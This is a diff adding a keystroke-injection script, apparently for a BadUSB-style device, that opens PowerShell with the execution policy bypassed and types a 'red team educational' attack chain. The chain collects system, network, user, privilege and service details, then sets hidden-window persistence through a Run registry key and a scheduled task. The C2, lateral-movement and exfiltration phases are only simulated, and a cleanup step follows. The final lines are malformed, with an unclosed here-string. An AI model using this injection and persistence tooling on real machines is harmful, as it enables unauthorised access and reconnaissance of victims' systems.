@@ -1,0 +1,522 @@
+Delay 3000
+GuiR
+Delay 500
+PrintLine powershell -ExecutionPolicy Bypass
+Delay 1500
+
+# Setup and initialization
+PrintLine Write-Host "WINDOWS 11 RED TEAM EDUCATIONAL EXERCISE STARTING..." -ForegroundColor Red -BackgroundColor Black
+Delay 500
+PrintLine $workingDir = "$env:TEMP\RT_Education"
+Delay 200
+PrintLine if (-not (Test-Path $workingDir)) { New-Item -Path $workingDir -ItemType Directory -Force | Out-Null }
+Delay 200
+PrintLine function Log-Action { param([string]$action); $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; "$timestamp - $action" | Out-File -Append "$workingDir\redteam_educational_log.txt"; Write-Host "[*] $action" -ForegroundColor Cyan }
+Delay 300
+
+# Create log file with header
+PrintLine "WINDOWS 11 RED TEAM EDUCATIONAL EXERCISE - $(Get-Date)" | Out-File "$workingDir\redteam_educational_log.txt"
+Delay 200
+PrintLine "THIS IS A CONTROLLED CLASSROOM DEMONSTRATION" | Out-File -Append "$workingDir\redteam_educational_log.txt"
+Delay 200
+PrintLine "===================================================" | Out-File -Append "$workingDir\redteam_educational_log.txt"
+Delay 300
+
+# Phase 1: Target Validation
+PrintLine Log-Action "Starting target validation phase"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     $wv = (Get-ComputerInfo).WindowsVersion
+Delay 200
+PrintLine     if ($wv -lt 22000) {
+Delay 200
+PrintLine         Log-Action "Target is not Windows 11. Exiting for demonstration purposes."
+Delay 200
+PrintLine         exit
+Delay 200
+PrintLine     }
+Delay 200
+PrintLine     Log-Action "Confirmed Windows 11 target - Version: $wv"
+Delay 200
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during target validation: $_"
+Delay 200
+PrintLine     exit
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 2: Defense Evasion
+PrintLine Log-Action "Starting defense evasion phase"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     Log-Action "Simulating AMSI bypass attempt (no actual bypass performed)"
+Delay 200
+PrintLine     # Note: Actual bypass code would go here but is omitted for safety
+Delay 200
+PrintLine     $defenderStatus = Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IoavProtectionEnabled
+Delay 200
+PrintLine     Log-Action "Defender Status: RealTime = $($defenderStatus.RealTimeProtectionEnabled), IOAV = $($defenderStatus.IoavProtectionEnabled)"
+Delay 200
+PrintLine     $defenderStatus | Format-List | Out-File "$workingDir\defender_status.txt"
+Delay 200
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during defense evasion phase: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 3: Reconnaissance - System Information
+PrintLine Log-Action "Starting reconnaissance phase - System Information"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     Get-ComputerInfo | Select-Object CsDNSHostName, CsUserName, OsVersion, OsBuildNumber, CsManufacturer, CsModel | Format-List | Out-File "$workingDir\system_info.txt"
+Delay 300
+PrintLine     Log-Action "Collected basic system information"
+Delay 200
+PrintLine     # Windows 11 specific info
+Delay 200
+PrintLine     Get-AppxPackage -AllUsers | Where-Object {$_.IsFramework -eq $false} | Select-Object -First 20 Name, PackageFullName | Format-Table | Out-File "$workingDir\win11_apps.txt"
+Delay 300
+PrintLine     Log-Action "Collected Windows 11 app information"
+Delay 200
+PrintLine     # Hardware info
+Delay 200
+PrintLine     Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors | Format-List | Out-File "$workingDir\hardware_info.txt"
+Delay 300
+PrintLine     Get-WmiObject -Class Win32_PhysicalMemory | Select-Object Capacity, Speed, Manufacturer | Format-Table | Out-File -Append "$workingDir\hardware_info.txt"
+Delay 300
+PrintLine     Log-Action "Collected hardware information"
+Delay 200
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during system reconnaissance: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 3: Reconnaissance - Network Information
+PrintLine Log-Action "Starting reconnaissance phase - Network Information"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway | Format-Table | Out-File "$workingDir\network_config.txt"
+Delay 300
+PrintLine     Log-Action "Collected network configuration"
+Delay 200
+PrintLine     Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed | Format-Table | Out-File "$workingDir\network_adapters.txt"
+Delay 300
+PrintLine     Log-Action "Collected network adapter information"
+Delay 200
+PrintLine     # Check firewall status
+Delay 200
+PrintLine     Get-NetFirewallProfile | Select-Object Name, Enabled | Format-Table | Out-File "$workingDir\firewall_status.txt"
+Delay 300
+PrintLine     Log-Action "Collected firewall information"
+Delay 200
+PrintLine     # Network connections
+Delay 200
+PrintLine     Get-NetTCPConnection -State Established | Select-Object -First 20 LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Format-Table | Out-File "$workingDir\network_connections.txt"
+Delay 300
+PrintLine     Log-Action "Collected active network connections"
+Delay 200
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during network reconnaissance: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 3: Reconnaissance - User and Account Information
+PrintLine Log-Action "Starting reconnaissance phase - User Information"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     Get-LocalUser | Select-Object Name, Enabled, LastLogon, Description | Format-Table | Out-File "$workingDir\user_accounts.txt"
+Delay 300
+PrintLine     Log-Action "Collected user account information"
+Delay 200
+PrintLine     Get-LocalGroup | Select-Object Name | Format-Table | Out-File "$workingDir\local_groups.txt"
+Delay 300
+PrintLine     Log-Action "Collected local group information"
+Delay 200
+PrintLine     # Get admin group members
+Delay 200
+PrintLine     Get-LocalGroupMember -Group "Administrators" | Select-Object Name, PrincipalSource | Format-Table | Out-File "$workingDir\admin_group_members.txt"
+Delay 300
+PrintLine     Log-Action "Collected administrator group members"
+Delay 200
+PrintLine     # Current logged in user
+Delay 200
+PrintLine     whoami /all | Out-File "$workingDir\current_user_privileges.txt"
+Delay 300
+PrintLine     Log-Action "Collected current user privilege information"
+Delay 200
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during user reconnaissance: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 3: Reconnaissance - System Services and Processes
+PrintLine Log-Action "Starting reconnaissance phase - Services and Processes"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 30 Name, DisplayName, Status, StartType | Format-Table | Out-File "$workingDir\running_services.txt"
+Delay 300
+PrintLine     Log-Action "Collected service information"
+Delay 200
+PrintLine     # Get auto-start services
+Delay 200
+PrintLine     Get-Service | Where-Object {$_.StartType -eq "Automatic" -and $_.Status -eq "Running"} | Select-Object Name, DisplayName, Status | Format-Table | Out-File "$workingDir\autostart_services.txt"
+Delay 300
+PrintLine     Log-Action "Collected auto-start service information"
+Delay 200
+PrintLine     # Get processes
+Delay 200
+PrintLine     Get-Process | Select-Object -First 30 ProcessName, Id, CPU, WorkingSet, Path | Format-Table -AutoSize | Out-File "$workingDir\running_processes.txt"
+Delay 300
+PrintLine     Log-Action "Collected process information"
+Delay 200
+PrintLine     # Scheduled tasks
+Delay 200
+PrintLine     Get-ScheduledTask | Where-Object {$_.State -eq "Ready" -and $_.TaskPath -notlike "\Microsoft\*"} | Select-Object -First 20 TaskName, TaskPath, State | Format-Table | Out-File "$workingDir\scheduled_tasks.txt"
+Delay 300
+PrintLine     Log-Action "Collected scheduled task information"
+Delay 200
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during service reconnaissance: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 4: Persistence Demonstration
+PrintLine Log-Action "Starting persistence phase"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     # Create a demo payload script
+Delay 200
+PrintLine     $demoPayload = @"
+Delay 200
+PrintLine # This is an educational demo script
+Delay 200
+PrintLine Write-Output "Educational demo executed at `$(Get-Date)" | Out-File "$workingDir\demo_execution_log.txt"
+Delay 200
+PrintLine "@
+Delay 300
+PrintLine     Set-Content -Path "$workingDir\demo_payload.ps1" -Value $demoPayload
+Delay 300
+PrintLine     Log-Action "Created demo payload script"
+Delay 200
+PrintLine     # Registry persistence technique
+Delay 200
+PrintLine     $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Delay 200
+PrintLine     $regKeyName = "RT_EducationalDemo"
+Delay 200
+PrintLine     New-ItemProperty -Path $regKeyPath -Name $regKeyName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$workingDir\demo_payload.ps1`"" -PropertyType String -Force | Out-Null
+Delay 300
+PrintLine     Log-Action "Demonstrated registry persistence technique"
+Delay 200
+PrintLine     # Scheduled Task persistence
+Delay 200
+PrintLine     $taskName = "RT_Educational_Demo_Task"
+Delay 200
+PrintLine     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$workingDir\demo_payload.ps1`""
+Delay 300
+PrintLine     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
+Delay 300
+PrintLine     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Educational Red Team Demo" -Force | Out-Null
+Delay 300
+PrintLine     Log-Action "Demonstrated scheduled task persistence technique"
+Delay 200
+PrintLine     # WMI persistence (educational demonstration only)
+Delay 200
+PrintLine     Log-Action "Note: In a real attack, WMI event subscription persistence might be used here"
+Delay 200
+PrintLine     "# Educational note on WMI persistence technique" | Out-File "$workingDir\wmi_persistence_note.txt"
+Delay 200
+PrintLine     "# Example command (not executed):" | Out-File -Append "$workingDir\wmi_persistence_note.txt"
+Delay 200
+PrintLine     "# New-WMIEventSubscription -EventName Win32_LogonEvent -ScriptPath $workingDir\demo_payload.ps1" | Out-File -Append "$workingDir\wmi_persistence_note.txt"
+Delay 300
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during persistence phase: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 5: Command & Control Simulation
+PrintLine Log-Action "Starting C2 simulation phase"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     # Gather data that would be sent to C2
+Delay 200
+PrintLine     $hostname = [System.Net.Dns]::GetHostName()
+Delay 200
+PrintLine     $ipAddress = [System.Net.Dns]::GetHostAddresses($hostname) | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | Select-Object -ExpandProperty IPAddressToString
+Delay 300
+PrintLine     $c2Data = @{
+Delay 200
+PrintLine         "Hostname" = $hostname
+Delay 200
+PrintLine         "IPAddress" = $ipAddress
+Delay 200
+PrintLine         "WindowsVersion" = $wv
+Delay 200
+PrintLine         "Username" = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+Delay 200
+PrintLine         "IsAdmin" = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+Delay 200
+PrintLine         "ExecutionTime" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+Delay 200
+PrintLine         "SystemUptime" = (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
+Delay 200
+PrintLine     }
+Delay 300
+PrintLine     $c2Data | ConvertTo-Json | Out-File "$workingDir\simulated_c2_beacon.json"
+Delay 300
+PrintLine     Log-Action "Created simulated C2 beacon data"
+Delay 200
+PrintLine     # Simulate basic beacon behavior
+Delay 200
+PrintLine     for ($i = 1; $i -le 3; $i++) {
+Delay 200
+PrintLine         Log-Action "Simulated C2 beacon attempt $i"
+Delay 200
+PrintLine         "Beacon attempt $i at $(Get-Date)" | Out-File -Append "$workingDir\beacon_simulation.txt"
+Delay 300
+PrintLine         Start-Sleep -Seconds 1
+Delay 200
+PrintLine     }
+Delay 200
+PrintLine     # Educational note on common C2 channels
+Delay 200
+PrintLine     @"
+Delay 200
+PrintLine # Educational Note: Common C2 Communication Channels
+Delay 200
+PrintLine 1. HTTP/HTTPS requests
+Delay 200
+PrintLine 2. DNS tunneling 
+Delay 200
+PrintLine 3. Email protocols (SMTP, IMAP)
+Delay 200
+PrintLine 4. Social media APIs
+Delay 200
+PrintLine 5. Encrypted messaging protocols
+Delay 200
+PrintLine 6. Custom TCP/UDP protocols
+Delay 200
+PrintLine "@ | Out-File "$workingDir\c2_educational_notes.txt"
+Delay 300
+PrintLine     Log-Action "Added educational notes on C2 channels"
+Delay 200
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during C2 simulation phase: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 6: Privilege Escalation Checks
+PrintLine Log-Action "Starting privilege escalation checks phase"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     # Check current privileges
+Delay 200
+PrintLine     $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+Delay 300
+PrintLine     Log-Action "Current execution context is Admin: $isAdmin"
+Delay 200
+PrintLine     # Check for services with unquoted paths (educational - checks only)
+Delay 200
+PrintLine     Log-Action "Checking for services with unquoted paths"
+Delay 200
+PrintLine     Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch '^".*"$' -and $_.PathName -match '\s+'} | Select-Object -First 10 Name, DisplayName, PathName | Format-List | Out-File "$workingDir\unquoted_service_paths.txt"
+Delay 400
+PrintLine     # Check for AlwaysInstallElevated
+Delay 200
+PrintLine     $aie1 = Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue
+Delay 300
+PrintLine     if ($aie1) {
+Delay 200
+PrintLine         $aieValue1 = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
+Delay 300
+PrintLine         "AlwaysInstallElevated HKLM: $($aieValue1.AlwaysInstallElevated)" | Out-File "$workingDir\always_install_elevated.txt"
+Delay 300
+PrintLine     } else {
+Delay 200
+PrintLine         "AlwaysInstallElevated HKLM: Not configured" | Out-File "$workingDir\always_install_elevated.txt"
+Delay 300
+PrintLine     }
+Delay 200
+PrintLine     Log-Action "Checked AlwaysInstallElevated configuration"
+Delay 200
+PrintLine     # Check for Windows 11 specific UAC settings
+Delay 200
+PrintLine     $uacSettings = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA", "ConsentPromptBehaviorAdmin", "PromptOnSecureDesktop"
+Delay 300
+PrintLine     $uacSettings | Format-List | Out-File "$workingDir\uac_settings.txt"
+Delay 300
+PrintLine     Log-Action "Saved UAC settings information for educational review"
+Delay 200
+PrintLine     # Check for potentially vulnerable Windows 11 features
+Delay 200
+PrintLine     $win11VulnList = @"
+Delay 200
+PrintLine # Educational information on potential Windows 11 weak points:
+Delay 200
+PrintLine 1. New Windows 11 features with potential security implications
+Delay 200
+PrintLine 2. Third-party applications with known vulnerabilities
+Delay 200
+PrintLine 3. Misconfigurations in Windows 11 privacy settings
+Delay 200
+PrintLine "@ | Out-File "$workingDir\win11_security_considerations.txt"
+Delay 300
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during privilege escalation checks phase: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 7: Lateral Movement Simulation
+PrintLine Log-Action "Starting lateral movement simulation phase"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     # Discover other systems (simulated for educational purposes)
+Delay 200
+PrintLine     Log-Action "Simulating network discovery"
+Delay 200
+PrintLine     "SIMULATED NETWORK HOSTS (educational only):" | Out-File "$workingDir\simulated_network.txt"
+Delay 200
+PrintLine     "192.168.1.100 - DESKTOP-WIN11-01" | Out-File -Append "$workingDir\simulated_network.txt"
+Delay 200
+PrintLine     "192.168.1.101 - DESKTOP-WIN11-02" | Out-File -Append "$workingDir\simulated_network.txt"
+Delay 200
+PrintLine     "192.168.1.102 - SRV-DOMAIN-01" | Out-File -Append "$workingDir\simulated_network.txt"
+Delay 300
+PrintLine     # Admin share access check (safe check)
+Delay 200
+PrintLine     $testPath = Test-Path "\\localhost\C$"
+Delay 200
+PrintLine     "Admin share accessible: $testPath" | Out-File "$workingDir\share_access.txt"
+Delay 300
+PrintLine     Log-Action "Checked admin share access"
+Delay 200
+PrintLine     # Educational note on common lateral movement techniques
+Delay 200
+PrintLine     @"
+Delay 200
+PrintLine # Educational Note: Common Lateral Movement Techniques
+Delay 200
+PrintLine 1. Pass-the-Hash/Pass-the-Ticket
+Delay 200
+PrintLine 2. Windows Admin Shares
+Delay 200
+PrintLine 3. WMI/PowerShell Remoting
+Delay 200
+PrintLine 4. Remote Registry
+Delay 200
+PrintLine 5. RDP Tunneling
+Delay 200
+PrintLine 6. DCOM Lateral Movement
+Delay 200
+PrintLine "@ | Out-File "$workingDir\lateral_movement_educational_notes.txt"
+Delay 300
+PrintLine     Log-Action "Added educational notes on lateral movement techniques"
+Delay 200
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during lateral movement simulation phase: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 8: Data Discovery and Collection Simulation
+PrintLine Log-Action "Starting data discovery simulation phase"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     # Simulate finding interesting files (educational only)
+Delay 200
+PrintLine     Log-Action "Simulating data discovery"
+Delay 200
+PrintLine     "SIMULATED SENSITIVE FILE LOCATIONS (educational only):" | Out-File "$workingDir\simulated_sensitive_files.txt"
+Delay 200
+PrintLine     "C:\Users\<username>\Documents\financial-report-2025.xlsx" | Out-File -Append "$workingDir\simulated_sensitive_files.txt"
+Delay 200
+PrintLine     "C:\Users\<username>\Documents\project-plans\confidential-roadmap.docx" | Out-File -Append "$workingDir\simulated_sensitive_files.txt"
+Delay 200
+PrintLine     "C:\Users\<username>\AppData\Roaming\Microsoft\Credentials" | Out-File -Append "$workingDir\simulated_sensitive_files.txt"
+Delay 300
+PrintLine     # Educational notes on data exfiltration techniques
+Delay 200
+PrintLine     @"
+Delay 200
+PrintLine # Educational Note: Data Exfiltration Techniques
+Delay 200
+PrintLine 1. DNS tunneling
+Delay 200
+PrintLine 2. HTTPS/encrypted channels
+Delay 200
+PrintLine 3. Steganography
+Delay 200
+PrintLine 4. Custom protocols over allowed ports
+Delay 200
+PrintLine 5. Cloud storage APIs
+Delay 200
+PrintLine "@ | Out-File "$workingDir\data_exfiltration_educational_notes.txt"
+Delay 300
+PrintLine } catch {
+Delay 200
+PrintLine     Log-Action "Error during data discovery simulation phase: $_"
+Delay 200
+PrintLine }
+Delay 500
+
+# Phase 9: Cleanup (IMPORTANT for educational environments)
+PrintLine Log-Action "Starting cleanup phase"
+Delay 200
+PrintLine try {
+Delay 200
+PrintLine     # Wait before cleanup
+Delay 200
+PrintLine     Log-Action "Waiting 5 seconds before cleanup..."
+Delay 200
+PrintLine     Start-Sleep -Seconds 5
+Delay 5000
+PrintLine     # Remove persistence
+Delay 200
+PrintLine     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RT_EducationalDemo" -Force -ErrorAction SilentlyContinue
+Delay 300
+PrintLine     Unregister-ScheduledTask -TaskName "RT_Educational_Demo_Task" -Confirm:$false -ErrorAction SilentlyContinue
+Delay 300
+PrintLine     Log-Action "Removed persistence mechanisms"
+Delay 200
+PrintLine     # Package all educational logs for review
+Delay 200
+PrintLine     $date = Get-Date -Format "yyyyMMdd_HHmmss"
+Delay 200
+PrintLine     $archiveName = "$env:USERPROFILE\Desktop\RedTeam_Educational_Results_$date.zip"
+Delay 300
+PrintLine     # Create README
+Delay 200
+PrintLine     @"
+Delay 200
+PrintLine exit
